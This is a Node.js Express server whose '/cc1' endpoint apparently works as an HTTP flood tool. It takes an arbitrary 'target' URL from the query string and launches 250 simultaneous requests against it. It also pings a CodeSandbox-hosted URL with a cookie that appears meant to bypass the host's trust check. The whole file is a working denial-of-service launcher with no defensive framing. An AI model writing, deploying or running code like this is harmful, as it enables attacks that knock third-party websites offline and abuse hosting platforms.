import express from 'express';
import fetch from 'node-fetch';

const app = express();
const port = process.env.PORT || 3000;

app.get('/cc1', async (req, res) => {
  const target = req.query.target;

  if (!target) {
    return res.status(400).json({ error: "Missing 'target' query parameter" });
  }

  const clients = 250;
  const pingUrl = "https://2h2x4f-3000.csb.app/ping";

  try {
    // Fire-and-forget ping
    fetch(pingUrl, { headers: { "Cookie": "csb_is_trusted=true" } }).catch(() => {});

    // Launch 250 client fetches
    const clientPromises = Array.from({ length: clients }, (_, i) =>
      fetch(target)
        .then(r => r.text())
        .then(html => {
          const sizeMB = (Buffer.byteLength(html) / (1024 * 1024)).toFixed(2);
          return `Client ${i + 1}: ${sizeMB} MB`;
        })
        .catch(() => `Client ${i + 1}: error`)
    );

    const results = await Promise.all(clientPromises);
    res.status(200).json({ results });

  } catch (err) {
    res.status(500).json({ error: "Something went wrong", details: err.message });
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
